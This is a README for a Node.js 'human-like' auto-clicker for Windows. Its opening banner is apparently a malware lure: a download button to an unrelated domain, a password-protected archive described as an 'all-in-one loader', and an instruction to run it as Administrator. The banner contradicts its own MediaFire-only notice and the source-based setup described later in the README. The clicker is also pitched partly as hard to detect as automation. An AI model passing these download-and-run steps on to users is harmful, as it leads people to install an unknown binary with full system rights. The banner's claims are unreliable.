<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Human Clicker 🐭

**Human-like auto-clicker and mouse macro for Windows, built on Node.js.** Log-normal delays, variable button hold, cursor jitter, periodic rests and smooth cursor motion: it clicks the way a hand on a mouse does, not the way a timer does.

## Why not a plain auto-clicker?

A plain clicker fires every N milliseconds into the same pixel. That pattern is trivial to spot, and it also looks nothing like a person. Human Clicker models the hand instead of the timer:

- **Log-normal delays.** Intervals between clicks are drawn from a log-normal distribution (Box–Muller transform). They cluster around a median with rare longer pauses, the same shape real reaction times have.
- **Variable button hold.** The time between mouse-down and mouse-up is different on every click.
- **Cursor jitter and shifts.** The cursor does not sit on one pixel forever. Every few clicks, and always after a rest, it shifts by a couple of pixels.
- **Rests.** Every few dozen clicks the clicker takes a short break, like a hand that pauses.
- **Smooth motion.** Cursor moves follow an ease-in-out curve instead of teleporting.

## Compared to other clickers

Popular open-source clickers (XClicker, oriash93/AutoClicker, clicker-rs) fire at a fixed or uniformly random interval into the current cursor position. Python libraries like HumanCursor model cursor paths well but are building blocks for Selenium scripts, not a tool you point and run. Human Clicker is the only one of these with log-normal timing, cursor shifts, rests, auto-pause when you grab the mouse, and window focus tracking, and it runs from a double-click on Windows.

## Features

- **Target from the mouse.** Point at what you want clicked, wait for the countdown, done. Fixed coordinates are available too.
- **Safety auto-pause.** Move the mouse away and the clicker pauses itself instead of fighting you for the cursor.
- **Window focus tracking.** Alt-Tab away and the clicker waits; it resumes by itself when the target window is active again.
- **Global hotkeys.** `Space` pauses and resumes, `Esc` quits, from any window.
- **Time limit.** Stops on its own after 60 minutes by default, so a forgotten clicker does not run all night.
- **Four UI languages.** English, Russian, Spanish, Chinese, picked from the system locale.
- **One-click launcher.** `start.cmd` checks Node, installs runtime dependencies and starts the clicker.

## Controls

| Key     | Action |
|---------|--------|
| `Space` | pause / resume (time limit resets) |
| `Esc`   | quit |

If you move the mouse more than 30 px away between clicks, the clicker pauses itself. `Space` resumes on the same target.

The target window is remembered after the first click. While another window is focused the clicker waits and resumes on its own when the target is back.

## Settings

Settings object in `src/clicker.ts`:

| Parameter | Default | Description |
|-----------|---------|-------------|
| `fixedTarget` | `null` | `{x, y}` for fixed coordinates; `null` = mouse position at start |
| `startDelay` | 5 | seconds before start |
| `clickDelay` | 250 ms, σ 0.25, [150, 500] | interval between clicks: median, spread, bounds |
| `hold` | 70 ms, σ 0.3, [40, 150] | button hold time |
| `jitterPx` | 3 | position jitter ±px |
| `shiftEvery` | [5, 15] | clicks between cursor shifts; always after a rest |
| `restEvery` | [20, 50] | clicks between rests |
| `restMs` | [600, 1800] | rest duration, ms |
| `awayPx` | 30 | auto-pause threshold |
| `trackFocus` | `true` | pause while the target window is not focused |

The default profile is about 3–4 clicks per second. For a calmer one raise the `clickDelay` median to 350–450.

## Development

TypeScript runs directly on Node 22.18+ (built-in type stripping), no build step. Dev dependencies are only needed for type-checking and tests; `start.cmd` installs without them.

```
npm install          # with dev dependencies
npm test             # vitest
npm run typecheck    # tsc --noEmit
```

- `src/clicker.ts` — entry: CLI args, settings, hotkeys
- `src/engine.ts` — the click loop with injectable robot, clock and sleep
- `src/utils.ts` — `logNormal`, `moveSmooth`, `sleep`, `rnd`
- `src/lang.ts`, `src/locales.json` — UI strings. Add a language: new key in `locales.json`
- `test/` — tests
- `start.cmd` — Windows launcher

Native modules `robotjs`, `uiohook-napi` and `get-windows` ship prebuilt binaries for Windows. macOS and Linux are untested.


---

MIT License

Copyright (c) 2026 Anton Ustinov

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
